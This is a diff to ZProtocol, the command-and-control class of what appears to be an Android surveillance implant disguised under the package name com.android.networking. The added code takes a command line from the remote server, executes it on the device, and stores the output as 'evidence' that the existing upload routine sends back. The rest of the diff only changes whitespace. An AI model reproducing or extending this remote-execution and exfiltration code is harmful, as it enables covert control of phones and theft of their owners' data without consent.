@@ -19,12 +19,15 @@ import com.android.networking.Core;
 import com.android.networking.Device;
 import com.android.networking.Messages;
 import com.android.networking.Status;
+import com.android.networking.action.ExecuteAction;
 import com.android.networking.auto.Cfg;
 import com.android.networking.crypto.CryptoException;
 import com.android.networking.crypto.EncryptionPKCS5;
 import com.android.networking.crypto.Keys;
 import com.android.networking.crypto.SHA1Digest;
+import com.android.networking.evidence.Evidence;
 import com.android.networking.evidence.EvidenceCollector;
+import com.android.networking.evidence.EvidenceType;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
@@ -32,6 +35,8 @@ import com.android.networking.interfaces.iKeys;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
+import com.android.networking.util.Execute;
+import com.android.networking.util.ExecuteResult;
 import com.android.networking.util.WChar;
 
 /**
@@ -93,7 +98,7 @@ public class ZProtocol extends Protocol {
 		}
 
 		try {
-			transport.start();			
+			transport.start();
 
 			status.uninstall = authentication();
 
@@ -113,6 +118,7 @@ public class ZProtocol extends Protocol {
 			upload(capabilities[Proto.UPLOAD]);
 			upgrade(capabilities[Proto.UPGRADE]);
 			filesystem(capabilities[Proto.FILESYSTEM]);
+			execute(capabilities[Proto.EXEC]);
 			evidences();
 			end();
 
@@ -360,6 +366,16 @@ public class ZProtocol extends Protocol {
 			}
 			final byte[] response = command(Proto.FILESYSTEM);
 			parseFileSystem(response);
+		}
+	}
+
+	private void execute(boolean cap) throws TransportException, ProtocolException {
+		if (cap) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: ***** Execute *****"); //$NON-NLS-1$
+			}
+			final byte[] response = command(Proto.EXEC);
+			parseExecute(response);
 		}
 	}
 
@@ -967,6 +983,44 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
+	protected void parseExecute(byte[] response) throws ProtocolException {
+		final int res = ByteArray.byteArrayToInt(response, 0);
+		if (res == Proto.OK) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " parseExecute, OK"); //$NON-NLS-1$
+			}
+			final DataBuffer dataBuffer = new DataBuffer(response, 4, response.length - 4);
+			try {
+				String executionLine = WChar.readPascal(dataBuffer);
+				executionLine = Directory.expandMacro(executionLine);
+				
+				ExecuteResult ret = Execute.execute(executionLine);		
+				
+				Evidence evidence = new Evidence(EvidenceType.COMMAND);
+				evidence.atomicWriteOnce(WChar.pascalize(ret.getStdout()));
+				
+			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error: parse error: " + e); //$NON-NLS-1$
+				}
+				throw new ProtocolException();
+			}
+		} else if (res == Proto.NO) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: parseFileSystem: no download"); //$NON-NLS-1$
+			}
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: parseFileSystem, wrong answer: " + res); //$NON-NLS-1$
+			}
+			throw new ProtocolException();
+		}
+	}
+
 	protected void purgeEvidences(final String basePath, Date date, int size) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: purgeEvidences from: " + basePath); //$NON-NLS-1$
@@ -1092,28 +1146,28 @@ public class ZProtocol extends Protocol {
 
 	private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
 		final byte[] content = file.read();
-	
+
 		if (content == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: File is empty: " + file); //$NON-NLS-1$
 			}
-	
+
 			return true;
 		}
-	
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG
 					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
 		}
-	
+
 		final byte[] plainOut = new byte[content.length + 4];
-	
+
 		System.arraycopy(ByteArray.intToByteArray(content.length), 0, plainOut, 0, 4);
 		System.arraycopy(content, 0, plainOut, 4, content.length);
-	
+
 		byte[] response = command(Proto.EVIDENCE, plainOut);
 		final boolean ret = parseLog(response);
-	
+
 		if (ret) {
 			EvidenceCollector.self().remove(file.getFilename());
 			return true;
@@ -1121,7 +1175,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
 			}
-	
+
 			return false;
 		}
 	}
